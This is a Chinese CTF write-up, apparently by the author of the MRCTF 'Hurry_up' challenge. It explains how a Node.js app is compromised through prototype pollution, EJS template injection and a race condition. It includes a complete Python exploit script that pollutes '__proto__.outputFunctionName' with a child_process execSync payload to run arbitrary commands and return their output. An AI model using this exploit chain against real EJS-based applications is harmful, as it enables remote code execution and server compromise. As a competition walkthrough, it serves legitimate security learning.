## Hurry_up

### 考点

原型链污染，模板注入，条件竞争，不出网回显

### 分析

题目还是比较常规，整体来说不难。给了整个的dockefile。题目主体是个node应用。但通过npm查看并没有发现存在漏洞的依赖。题目代码也不多。简单分析一下，不难知道getValue.js的set方法中存在类似merge的操作。并且对键值没有任何的过滤（其实有个黑名单，但并未真正使用），这里的代码其实是改自mpath，这个包有过一个原型链污染的洞，官方就是通过添加黑名单来修复的。
因为应用使用ejs作为模板引擎，加上有了原型链污染的点，下一步自然就是配合模板注入去rce。但进一步尝试，可以发现应用中只有在`/`路由中有模板渲染的操作。而原型链污染的触发点是在`/hide`路由。此外，在应用的入口有个对于原型链污染的防护机制。

```javascript
// csp and no way of pp
app.use(async (req, res, next) => {
    res.header(
        "Content-Security-Policy",
        "default-src 'self';"
    );
    await new Promise(function (resolve) {
        for (var key in Object.prototype) {
            console.log(key);
            delete Object.prototype[key];
        }
        resolve()
    }).then(next)
});
```

所以就算我们通过`/hide`成功污染到原型链，但在下次进入`/`的之前，Object便会被删除所有的属性。我们污染到的属性也就被删除了。
这里便是可以竞争的点。我么知道，对于node，所有请求共用同一个环境，这也就是为什么如果一个请求污染到了原型链，那么之后所有的请求都会受到影响。所以如果，我们在进入`/`之后，而赶在模板渲染之前，在另外一个请求中完成对原型链的污染，这样就可以了。由于node是单线程异步非阻塞模式的，意味着如果一个请求没有处理结束或进入阻塞，下一个请求是不会开始处理的。而在这个题目中，其实有几行很扎眼的代码，帮助我们让给到`/`的请求在模板渲染前进入阻塞。
~~其实可以用一些合乎程序逻辑的数据库查询等io操作把这个阻塞伪装的更好(x~~

```javascript
exports.safeCheck = async function () {
    return await new Promise(function (resolve) {
        setTimeout(resolve, 100);
    })
}
```

所以卡住这个时间点，竞争就好了。
但通过dockerfile可以知道，题目中配置了防火墙，不允许主动访问外网，所以要把命令回显写到response对象中。常见思路可以使用hook，劫持res.end()，~~但对于共用靶机来说，这样太不可控了~~，但因为题目有关于hook的黑名单。~~也不知道能不能防的住~~。

```javascript
var blacklist = ['{', '}', 'function','ook'];
```

### exp

```python
import requests
import threading
from pwn import *
import time
import random


ip=sys.argv[1]
port=sys.argv[2]
command=sys.argv[3]
flag1=True
tempTime = 20

url="http://"+ip+":"+str(port)+"/"

def attack(command):
    global flag1
    t1 = threading.Thread(target=tar1,args=(command,))
    t2 = threading.Thread(target=tar2)
    t2.start()

    # time.sleep(random.random())
    t1.start()
    # time.sleep(2)
    

def tar1(command):
    global flag1
    ran1=-1
    time1=-1
    while flag1:
        print("tar1")
        ran1 = random.random()
        time.sleep(ran1)
        requests.get(
            url+"hide",
            params={
                "path":"a.__proto__.outputFunctionName",
                "value":'''a=1;
        return process.mainModule.require('child_process').execSync('{}').toString();
        var b'''.format(command)
            })
        time1 = time.time()
        # flag1=False
    print("ran1="+str(time1))

s=b'''GET / HTTP/1.1
Host: 127.0.0.1:4000
Connection: close
Pragma: no-cache
Cache-Control: no-cache

'''
def tar2():
    global flag1
    global tempTime
    try:
        while tempTime>0:
            ran2 = random.random()
            time.sleep(ran2)
            io = remote(ip,port)
            io.send(s)
            time2 = time.time()
            re=io.recv()
            # print(re)
            if(b'MRCTF{' in re):
                print(re)
                flag1 =False
                print("ran2="+str(time2))
                return
            io.close()
            tempTime=tempTime-1
        print("fialed!")
        flag1 =False
    except:
        flag1=False



if __name__ == '__main__':
    attack(command)
# python3 ./exp.py 127.0.0.1 4000 'cat /flag'
```

因为是有条件竞争，时间窗给的也不大，exp默认尝试20次，如果没成功可以多运行几次。
关于污染之后如何命令执行并将结果返回，出题人之前的写法十分丑陋，赛后和师傅们交流学习到了十分优雅的写法，这里直接换到wp里了hhh。好像确实是很常规的操作，只能说出题人露怯了。
此外，由于ejs在比赛前3天修复了漏洞并更新到3.1.7。但出题的时候是1个月前，所以附件中写的是 `^3.1.6`。导致一些师傅本地跑附件时搭建的环境和服务器上的有出入。给师傅们造成的不便，出题人深表歉意＞﹏＜。
